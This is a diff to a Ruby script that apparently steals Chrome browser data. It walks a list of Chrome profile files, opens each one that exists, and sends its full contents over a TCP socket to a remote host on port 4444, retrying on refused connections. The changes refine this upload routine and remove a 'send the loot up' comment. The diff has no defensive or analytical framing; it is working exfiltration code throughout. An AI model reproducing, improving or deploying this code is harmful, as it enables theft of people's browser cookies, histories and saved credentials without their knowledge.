@@ -2,32 +2,43 @@
 require 'socket'
 
 MAX_ATTEMPTS = 5
-SIZE = 1024
+RETRY_INTERVAL = 15 # in seconds
+SIZE = 1024 * 1024 * 10
 
-def SendFile(rHost = 'localhost', port = 4444, fileNameTOSend)
+def SendFile(rHost = 'localhost', port = 4444, fileNameToSend)
 
   num_attempts = 0
-
   begin
 
     num_attempts += 1
-    #Try to open up a connection to the server
-    TCPSocket.open(rHost, port) do |socket|
-      #Upload the file
-      File.open(fileNameTOSend, 'rb') do |file|
+    #Try to open up a connection to the server and upload the file
+    <<-FileOpenInChunks
+      File.open(fileNameToSend, 'rb') do |file|
         while chunk = file.read(SIZE)
           socket.write(chunk)
         end
       end
-      end
+    FileOpenInChunks
+
+    sock = TCPSocket.open(rHost, port)
+    file = open(fileNameToSend, "rb")
+    fileContent = file.read
+    sock.puts(fileContent)
+    sock.close
+
+    puts "File #{fileNameToSend} uploaded sucessfully"
+
       # If there is no luck with the connection, try again few times
   rescue Errno::ECONNREFUSED # use general error handling with ::Exception => e
     if num_attempts <= MAX_ATTEMPTS
-      sleep(15*60) # minutes * 60 seconds
+      puts "#{num_attempts}. Attempt to init TCP Connection was refused from #{rHost}:#{port}"
+      puts "Retrying in #{RETRY_INTERVAL} seconds"
+      sleep(RETRY_INTERVAL) # minutes * 60 seconds
       retry
     else
-
-  end
+      # If no more attempts left, we quit
+      puts "After #{MAX_ATTEMPTS} retries, no successful connection made"
+    end
 
   end
 end
@@ -58,35 +69,8 @@ chrome_FileNames = { # just uncomment what's not needed
 chrome_FileNames.each_value do |chrome_File|
     # Opening file and
     # Confirming its existence : puts "Suspected file #{chrome_Path}#{chrome_File} exists"
-  currentFile = File.open(chrome_Path+chrome_File.to_s) if File::exists?( chrome_Path+chrome_File.to_s )
-  SendFile(currentFile)
+  currentFileName = chrome_Path+chrome_File.to_s
+  currentFile = File.open(currentFileName, 'rb') if File::exists?(currentFileName)
+  puts "File upload session: #{currentFileName}"
+  SendFile(currentFileName)
 end
-
-
-
-
-#Let's send the loot up
-#	read binary from memory
-
-
-
-
-
-#File.open("c:/fajl.txt") if File::exists?( "c:/fajl.txt" )
-
-=begin
-## read file by bytes
-myfile = "c:/fajl.txt"
-if File::exists?( myfile )
-puts myfile.to_s + "  exists"
-  puts "Below is the content:"
-#open the file
-aFile = File.new("c:/fajl.txt", "r")
-  # read by bytes (20 bytes here)
-content = aFile.sysread(20)
-puts content
-else
-  puts myfile.to_s + "  not exists"
-end
-
-=end
